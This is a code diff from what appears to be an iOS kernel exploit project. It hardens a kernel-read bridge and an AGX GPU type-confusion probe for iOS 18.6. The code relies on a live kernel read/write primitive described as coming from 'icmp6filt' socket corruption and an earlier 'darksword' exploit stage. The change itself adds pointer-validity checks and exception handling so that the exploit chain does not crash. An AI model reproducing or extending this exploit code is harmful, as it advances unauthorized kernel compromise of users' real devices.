@@ -3697,8 +3697,14 @@ static uint64_t ool_smr(uint64_t v) { return kpSMRDecode(v); }
 
 /* ---- AGX stamp-slot type confusion (18.6: no safeMetaCast) ---- */
 
+/* Crash-safe kread bridge.  gPrimitives.kreadbuf may be NULL (pe_v1 not
+ * promoted) or, after a half-promoted / torn-down chain, a stale non-NULL
+ * pointer.  Never call a pointer that does not look like userland code. */
 static int agx_kread(uint64_t addr, void *buf, size_t len) {
-    return gPrimitives.kreadbuf ? (gPrimitives.kreadbuf(addr, buf, len) == 0 ? 0 : -1) : -1;
+    if (!gPrimitives.kreadbuf) return -1;
+    uintptr_t fn = (uintptr_t)gPrimitives.kreadbuf;
+    if (fn < 0x10000u || fn >= 0xfffffff000000000ULL) return -1;
+    return gPrimitives.kreadbuf(addr, buf, len) == 0 ? 0 : -1;
 }
 
 + (NSString *)agxTypeConfProbeReport {
@@ -3712,15 +3718,32 @@ static int agx_kread(uint64_t addr, void *buf, size_t len) {
     // kexploit_disarm_for_close() (atexit + applicationWillTerminate) restores
     // the pointer before the process dies. Do not close the KRW sockets before
     // that runs.
+    // darksword_control_socket_pcb() only returns a global (0 when pe_v1 is
+    // not promoted).  Wrap the call so a bad symbol/PLT can never take the
+    // button path down with the app.
+    uint64_t agx_pcb = 0;
+    @try {
+        agx_pcb = darksword_control_socket_pcb();
+    } @catch (NSException *e) {
+        agx_pcb = 0;
+    }
     kpNote(r, [NSString stringWithFormat:@"  pe_v1/KRW state: %@ (icmp6filt corruption stays live for kread; disarmed on exit)",
-           (darksword_control_socket_pcb() != 0) ? @"LIVE — same process as this probe" : @"not live"]);
+           (agx_pcb != 0) ? @"LIVE — same process as this probe" : @"not live"]);
 
     agx_tc_krw_t krw;
     memset(&krw, 0, sizeof(krw));
-    krw.kread = agx_kread;
+    /* Only hand the bridge to the probe when kreadbuf is present AND
+     * looks like a real code pointer.  A garbage non-NULL pointer would
+     * crash the probe the moment it snapshots. */
+    int agx_krw_ok = 0;
+    if (gPrimitives.kreadbuf) {
+        uintptr_t fn = (uintptr_t)gPrimitives.kreadbuf;
+        agx_krw_ok = (fn >= 0x10000u && fn < 0xfffffff000000000ULL);
+    }
+    if (agx_krw_ok) krw.kread = agx_kread;
 
     static char cbuf[256 * 1024];
-    size_t n = agx_typeconf_probe_run(cbuf, sizeof(cbuf), &krw);
+    size_t n = agx_typeconf_probe_run(cbuf, sizeof(cbuf), agx_krw_ok ? &krw : NULL);
     if (n) [r appendFormat:@"%s", cbuf];
     else   [r appendString:@"FAIL: agx_typeconf_probe_run returned 0\n"];
     return r;
